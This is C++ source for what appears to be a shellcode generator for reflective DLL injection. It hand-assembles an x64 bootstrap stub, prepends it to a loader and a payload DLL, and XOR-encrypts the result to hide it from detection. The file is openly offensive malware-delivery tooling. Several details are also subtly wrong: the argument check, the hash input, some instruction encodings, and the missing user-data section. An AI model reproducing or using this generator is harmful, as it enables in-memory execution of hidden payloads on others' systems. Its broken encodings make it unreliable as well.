#include "generator.hpp"

#include <string>
#include <vector>

#include "../shared/crypto.hpp"
#include "../shared/futils.hpp"

int main(int argc, char **argv) {
  uint8_t flag = false;
  std::string loaderPath, payloadPath, funcName, funcParameter, outputPath;

  static struct option longOptions[] = {
      {"loader", required_argument, 0, 'l'},
      {"payload", required_argument, 0, 'p'},
      {"function", required_argument, 0, 'n'},
      {"parameter", required_argument, 0, 'a'},
      {"output", required_argument, 0, 'o'},
      {"flag", no_argument, 0, 'f'},
      {"help", no_argument, 0, 'h'},
      {0, 0, 0, 0}};

  auto optionIndex = 0;
  int c;

  while ((c = getopt_long(argc, argv, "l:p:n:a:o:fh", longOptions, &optionIndex))) {
    switch (c) {
      case 'l':
        loaderPath = optarg;
        break;
      case 'p':
        payloadPath = optarg;
        break;
      case 'n':
        funcName = optarg;
        break;
      case 'a':
        funcParameter = optarg;
        break;
      case 'o':
        outputPath = optarg;
        break;
      case 'f':
        flag = true;
        break;
      case 'h':
        PrintHelp(argv);
        return 0;
      default:
        PrintHelp(argv);
        return 1;
    }
  }

  if (loaderPath.empty() || payloadPath.empty() || funcName.empty() || funcParameter.empty(), outputPath.empty()) {
    std::cout << "[!] Missing required arguments" << std::endl;
    PrintHelp(argv);
    return 1;
  }

  std::cout << "[+] Loader path: " << loaderPath << std::endl;
  std::cout << "[+] Payload path: " << payloadPath << std::endl;
  std::cout << "[+] Output path: " << outputPath << std::endl;

  auto loaderContents = ReadFromFile(loaderPath);
  auto payloadContents = ReadFromFile(payloadPath);

  // Compose the complete shellcode from loader, payload, and bootstrap

  std::vector<BYTE> bootstrap;
  DWORD funcParameterHash = CalculateHash(funcParameter);

  /*
      1.) Save the current location in memory for calculating offsets later
  */

  // Call the next instruction (push next instruction address to stack)
  bootstrap.push_back(0xe8);
  bootstrap.push_back(0x00);
  bootstrap.push_back(0x00);
  bootstrap.push_back(0x00);
  bootstrap.push_back(0x00);

  // pop rcx -> Pop the value saved on the stack into rcx to caputre our current location in memory
  bootstrap.push_back(0x59);

  // mov r8, rcx -> Copy the value of rcx into r8 before starting to modify rcx
  bootstrap.push_back(0x49);
  bootstrap.push_back(0x89);
  bootstrap.push_back(0xc8);

  /*
      2.) Align the stack and create shadow space
  */

  // push rsi -> Save the original value
  bootstrap.push_back(0x56);

  // mov rsi, rsp -> Stores the current stack pointer in rsi for later
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x89);
  bootstrap.push_back(0xe6);

  // and rsp, 0xfffffffffffffff0 -> Align the stack to 16 bytes
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x83);
  bootstrap.push_back(0xe4);
  bootstrap.push_back(0xf0);

  // sub rsp, 0x30 -> (48 bytes) Create shadow space on the stack (required for x64, minimum of 32 bytes required for rcx, rdx, r8, and r9)
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x83);
  bootstrap.push_back(0xec);
  bootstrap.push_back(6 * 8);  // 6 (args) * 8 (bytes)

  /*
      3.) Setup reflective loader parameters: Place the last 5th and 6th arguments on the stack (rcx, rdx, r8, and r9 are already on the stack as the first 4 arguments)
  */

  // mov qword ptr [rsp + 0x20], rcx (shellcode base + 5 bytes) -> (32 bytes) Push in the shellcode base address as the 5th argument
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x89);
  bootstrap.push_back(0x4c);
  bootstrap.push_back(0x24);
  bootstrap.push_back(4 * 8);  // 4 (args) * 8 (bytes)

  // sub qword ptr [rsp + 0x20], 0x5 (shellcode base) -> Modify the 5th argument to point to the start of the real shellcode base address
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x83);
  bootstrap.push_back(0x6c);
  bootstrap.push_back(0x24);
  bootstrap.push_back(4 * 8);  // 4 (args) * 8 (bytes)
  bootstrap.push_back(5);      // Minus 5 bytes (because call 0x00 is 5 bytes to get the real shellcode base address)

  // mov dword ptr [rsp + 0x28], <flags> -> (40 bytes) Push in the flags as the 6th argument
  bootstrap.push_back(0xc7);
  bootstrap.push_back(0x44);
  bootstrap.push_back(0x24);
  bootstrap.push_back(5 * 8);  // 5 (args) * 8 (bytes)
  bootstrap.push_back(flag);

  /*
      4.) Setup reflective loader parameters: 1st -> rcx, 2nd -> rdx, 3rd -> r8, 4th -> r9
  */

  // mov r9, <funcParameterSize> -> Copy the 4th parameter, the size of the function parameter, into r9
  bootstrap.push_back(0x41);
  bootstrap.push_back(0xb9);
  auto funcParameterSize = static_cast<DWORD>(funcParameter.size());
  bootstrap.push_back(static_cast<BYTE>(funcParameterSize));

  // add r8, <funcParameterOffset> + <payloadSize> -> Copy the 3rd parameter, the offset of the function parameter, into r8 and add the payload size
  bootstrap.push_back(0x49);
  bootstrap.push_back(0x81);
  bootstrap.push_back(0xc0);
  auto funcParameterOffset = (BOOTSTRAP_LEN - 5) + loaderContents.size() + payloadContents.size();

  for (size_t i = 0; i < sizeof(funcParameterOffset); i++) {
    bootstrap.push_back(static_cast<BYTE>(funcParameterOffset >> (i * 8) & 0xff));
  }

  // mov edx, <funcParameterHash> -> Copy the 2nd parameter, the hash of the function parameter, into edx
  bootstrap.push_back(0xba);

  for (size_t i = 0; i < sizeof(funcParameterHash); i++) {
    bootstrap.push_back(static_cast<BYTE>(funcParameterHash >> (i * 8) & 0xff));
  }

  // add rcx, <payloadOffset> -> Copy the 1st parameter, the address of the payload, into rcx
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x81);
  bootstrap.push_back(0xc1);
  auto payloadOffset = (BOOTSTRAP_LEN - 5) + loaderContents.size();

  for (size_t i = 0; i < sizeof(payloadOffset); i++) {
    bootstrap.push_back(static_cast<BYTE>(payloadOffset >> (i * 8) & 0xff));
  }

  /*
      5.) Call the reflective loader
  */

  // Call <reflectiveLoaderAddress> -> Call the reflective loader address
  bootstrap.push_back(0xe8);
  auto reflectiveLoaderAddress = (BOOTSTRAP_LEN - 5) + loaderContents.size();

  for (size_t i = 0; i < sizeof(reflectiveLoaderAddress); i++) {
    bootstrap.push_back(static_cast<BYTE>(reflectiveLoaderAddress >> (i * 8) & 0xff));
  }

  // Add padding
  bootstrap.push_back(0x90);
  bootstrap.push_back(0x90);

  /*
      6.) Restore the stack and return to the original location (caller)
  */

  // mov rsp, rsi -> Restore the original stack pointer
  bootstrap.push_back(0x48);
  bootstrap.push_back(0x89);
  bootstrap.push_back(0xf4);

  // pop rsi -> Restore the original value
  bootstrap.push_back(0x5e);

  // ret -> Return to the original location
  bootstrap.push_back(0xc3);

  // Add padding
  bootstrap.push_back(0x90);
  bootstrap.push_back(0x90);

  if (bootstrap.size() != BOOTSTRAP_LEN) {
    std::cout << "[!] Bootstrap size mismatch: " << bootstrap.size() << " != " << BOOTSTRAP_LEN << std::endl;
    return 1;
  }

  std::cout << "[+] Bootstrap size: " << bootstrap.size() << std::endl;
  std::cout << "[+] Loader size: " << loaderContents.size() << std::endl;
  std::cout << "[+] Payload size: " << payloadContents.size() << std::endl;

  /*
      Form the complete shellcode with the following structure:
          - Bootstrap
          - RDI shellcode
          - Payload DLL bytes
          - User data
  */

  bootstrap.insert(bootstrap.end(), loaderContents.begin(), loaderContents.end());
  bootstrap.insert(bootstrap.end(), payloadContents.begin(), payloadContents.end());

  // XOR with a random content length key
  std::cout << "[+] XOR'ing the shellcode..." << std::endl;
  auto key = GenerateKey(bootstrap.size());
  XorCipher(&bootstrap, key);

  std::cout << "[+] Total XOR'd shellcode size: " << bootstrap.size() << std::endl;

  WriteToFile(outputPath, bootstrap);
  std::cout << "[+] Wrote the final shellcode to " << outputPath << std::endl;

  auto keyPath = outputPath + ".key";
  WriteToFile(keyPath, key);
  std::cout << "[+] Wrote the XOR key to " << keyPath << std::endl;

  return 0;
}

void PrintHelp(char **argv) {
  std::cout << "Usage: " << argv[0] << " [ARGUMENTS] [OPTIONS]" << std::endl;
  std::cout << "\nArguments:" << std::endl;
  std::cout << "\t-l, --loader      Path to loader file" << std::endl;
  std::cout << "\t-p, --payload     Path to payload file" << std::endl;
  std::cout << "\t-n, --function    Function name to call inside payload" << std::endl;
  std::cout << "\t-a, --parameter   Function parameter to pass to the called function" << std::endl;
  std::cout << "\t-o, --output      Path to output file" << std::endl;
  std::cout << "\nOptions:" << std::endl;
  std::cout << "\t-f, --flag        Flag to enable debug mode" << std::endl;
  std::cout << "\t-h, --help        Print this help message" << std::endl;
}
